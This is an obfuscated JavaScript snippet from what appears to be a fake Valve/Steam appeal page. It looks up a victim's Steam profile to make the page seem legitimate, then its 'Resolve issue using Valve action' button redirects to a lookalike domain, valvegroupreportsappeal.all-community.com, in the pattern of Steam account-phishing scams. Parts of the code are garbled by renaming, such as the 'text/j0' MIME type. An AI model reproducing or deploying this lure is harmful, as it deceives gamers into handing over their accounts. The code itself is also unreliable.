async function search() { const a1 = document.getElementById('searchInput').value.trim(); const b2 = document.getElementById('loadingSpinner'); const c3 = document.getElementById('c3'); const d4 = document.getElementById('d4'); if (a1 === "") { alert("Please enter a Steam profile link or ID."); return; } b2.style.display = "block"; try { let e5 = "Dis4mik3"; let f6 = "image.png"; if (a1.startsWith("https://steamcommunity.com/")) { const g7 = a1.replace("https://steamcommunity.com/", ""); const h8 = `https://api.codetabs.com/v1/proxy?quest=https://steamcommunity.com/${g7}?j0=1`; const i9 = await fetch(h8); const j0 = await i9.text(); const k1 = new DOMParser(); const j0Doc = k1.parseFromString(j0, "text/j0"); e5 = j0Doc.getElementsByTagName("steamID")[0]?.textContent || e5; f6 = j0Doc.getElementsByTagName("avatarFull")[0]?.textContent || f6; } setTimeout(() => { b2.style.display = "none"; c3.style.display = "none"; d4.innerHTML = ` <div class="result-area"> <div class="steam-id">${a1}</div> <div class="profile-card"> <img src="${f6}" alt="Avatar"> <div class="profile-info"> <p class="profile-e5">${e5}</p> <p class="profile-status">Currently Offline</p> </div> </div> </div> <div class="action-container"> <button class="action-button" onclick="redirectValve()">Resolve issue using Valve action.</button> <img class="action-image" src="https://i.imgur.com/U5cEibR.png" alt="Valve Info"> </div> `; }, 1500); } catch (error) { console.error(error); alert("Failed to fetch Steam profile data."); } } function redirectValve() { window.location.href = "https://valvegroupreportsappeal.all-community.com/"; }